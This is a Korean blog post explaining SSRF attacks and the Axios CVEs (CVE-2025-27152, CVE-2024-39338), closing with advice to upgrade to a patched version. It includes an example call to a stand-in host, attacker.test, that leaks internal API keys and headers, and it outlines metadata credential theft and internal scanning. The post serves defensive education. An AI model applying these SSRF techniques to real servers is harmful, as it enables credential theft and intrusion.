---
title: "Axios 버전을 올리게 된 이유"
pubDate: 2025-07-18
description: "SSRF(Server-Side Request Forgery)는 서버 측에서 위조된 요청을 발생시켜 직접적인 접근이 제한된 내부 자원에 접근하거나 데이터를 유출하고 오작동을 유발하는 공격입니다."
tags: ["JavaScript", "보안"]
---

SSRF(Server-Side Request Forgery)는 서버 측에서 위조된 요청을 발생시켜 직접적인 접근이 제한된 내부 자원에 접근하거나 데이터를 유출하고 오작동을 유발하는 공격입니다.

## ❗️ SSRF(Server-Side Request Forgery)란 무엇인가요?
SSRF는 **서버 측에서 위조된 HTTP 요청을 발생시켜 서버 내부 자원에 접근하거나 외부로 데이터를 유출, 또는 시스템의 오작동을 유발하는 공격**입니다. 

공격 형태가 위조된 HTTP 요청(Request Forgery)을 이용한다는 점에서 CSRF(Cross Site Request Forgery)와 유사하지만, **공격이 발현되는 지점이 서버 측(Server Side)인지 클라이언트 측(Client Side)인지에 따라 구분**됩니다. 

CSRF가 사용자의 웹 브라우저를 하이재킹하여 악성 요청을 수행하게 만드는 반면, SSRF는 **접근이 제한된 내부 환경에 대한 추가 공격(Post-Exploitation)이 가능하여 공격의 영향도가 더 높아질 수 있습니다**.

SSRF는 **OWASP Top 10에 선정된 웹 공격 기법** 중 하나로, 2021년 버전에서는 A10:2021 Server-Side Request Forgery(SSRF)라는 항목으로 새롭게 추가되었습니다.

---

## 🤔 SSRF는 어떤 방식으로 공격을 할 수 있나요?
SSRF 공격은 서버가 의도하지 않은 내부 시스템에 접근하도록 유도하여 다양한 방식으로 악용될 수 있습니다.

*   **내부 시스템 접근 및 자격 증명 획득**:
    *   서비스 제공자가 의도하지 않은 **내부 시스템(도메인 및 IP 등 이용)에 접근**하는 데 사용됩니다.
    
    *   특히, 클라우드 환경에서는 **클라우드 메타데이터 파일 탈취** 및 **자격 증명(Credential) 탈취**에 SSRF 취약점이 활용될 수 있습니다.

*   **민감 정보 유출 및 시스템 조작**:
    *   공격자는 서버에 이미지 URL과 같은 데이터를 요청하는 것처럼 위장하지만, 실제로는 서버가 내부적으로 접근 가능한 민감한 정보를 노출할 수 있는 엔드포인트를 호출하도록 유도합니다.
    
    *   이 과정에서 서버는 **의도치 않게 비밀번호, 토큰, 기타 내부 자원과 같은 민감한 데이터를 공격자에게 반환**할 수 있습니다.

*   **내부망 스캔 및 조작**:
    *   공격자는 DMZ 영역 뒤에 있는 인스턴스의 IP나 `file` 스키마를 이용한 로컬 파일 경로 등을 요청하여 **내부망(예: 127.0.0.1, 메타데이터 서버 등)을 대상으로 요청을 유도하여 내부 시스템 정보를 스캔하거나 조작**할 수 있습니다.
    
    *   SSRF 공격을 통해 공격자 PC에서 직접 접근이 불가능한 내부 서버에 대한 **포트 스캐닝 작업**이 가능하며, **서브 도메인 무작위 대입 공격**을 수행하여 내부 서버의 웹 페이지에 접근하거나 **`robots.txt`와 같은 내부 서버 파일을 탈취**할 수도 있습니다.

*   **인증 정보 유출**:
    *   널리 사용되는 HTTP 클라이언트 라이브러리(예: Axios)에서 SSRF 취약점이 발견될 경우, `baseURL`이 설정되어 있어도 **절대 URL이 전달되면 이를 우선 처리하여 내부 API 전용 인증키(X-API-KEY), 토큰, 쿠키 등 모든 헤더 값이 공격자 서버로 유출**될 수 있습니다.

---
### ⁉️ Axios에서는 어떤 취약점이 있었나요?
자바스크립트와 Node.js 환경에서 **가장 많이 사용하는 HTTP 클라이언트 중 하나인 Axios에서 심각한 SSRF 취약점이 발견**되었습니다.

*   **관련 CVE**: CVE-2025-27152 및 CVE-2024-39338으로 등록되었습니다.
*   **영향을 받는 버전**: Axios (npm) 버전 **1.3.2 이상 1.7.3 이하**, 또는 **1.7.9 이하**에서 발생합니다.
*   **패치된 버전**: 1.7.4 버전 이상으로 업그레이드하여 해결할 수 있으며, **1.8.2 버전에서 공식적으로 패치**되었습니다.
*   **문제점**: Axios 1.7.2 버전에서 **경로 상대 URL(path-relative URL)이 프로토콜 상대 URL(protocol-relative URL)로 잘못 처리되는 예상치 못한 동작**으로 인해 SSRF 취약점이 발생했습니다.

	- 예를 들어, `axios.create()`를 사용하여 `baseURL`(`http://example.test/api/v1/users/`)과 내부 API 전용 헤더(`X-API-KEY`)를 설정한 `internalAPIClient`가 있다고 가정할 때: 
    
       `internalAPIClient.get("http://attacker.test/")`와 같이 **절대 URL이 인자로 들어오면**, `baseURL`을 무시하고 **해당 절대 URL(`http://attacker.test/`)로 요청을 전송**합니다.
       
     이때, `internalAPIClient`에 설정되어 있던 **내부 API 전용 인증키(X-API-KEY)를 포함한 모든 헤더 값이 공격자 서버로 함께 유출**됩니다.

*   **보안 위협**:
    *   **인증 정보 유출**: `axios.create()`를 통해 설정한 **비공개 API 키, 토큰, 쿠키 등 모든 헤더 값이 외부로 유출**될 수 있습니다.
    
    *   **SSRF**: 공격자가 내부망(예: 127.0.0.1, 메타데이터 서버 등)을 대상으로 요청을 유도하여 **내부 시스템 정보를 스캔하거나 조작**할 수 있습니다.


---

## 🔓 Axios에서는?

Axios에서는 1.7.9 버전의 문제 해결을 위해 1.8.2 버전까지 버그 픽스를 진행했습니다.

- 1.8.0: allowAbsoluteUrls 옵션 추가 및 Breaking Change
https://github.com/axios/axios/releases/tag/v1.8.0

- 1.8.1: crypto 모듈 임포트 이슈 해결
https://github.com/axios/axios/releases/tag/v1.8.1

- 1.8.2: CVE-2025-27152 추가 보안 수정
https://github.com/axios/axios/releases/tag/v1.8.2

- 1.8.3: 타입 정의 및 어댑터 수정
https://github.com/axios/axios/releases/tag/v1.8.3

- 1.8.4: 최종 안정화
https://github.com/axios/axios/releases/tag/v1.8.4

현재 Axios는 1.10.0 버전까지 릴리즈 되었으니 1.9.0 버전 이상을 사용하는 것이 좋을 것 같습니다.
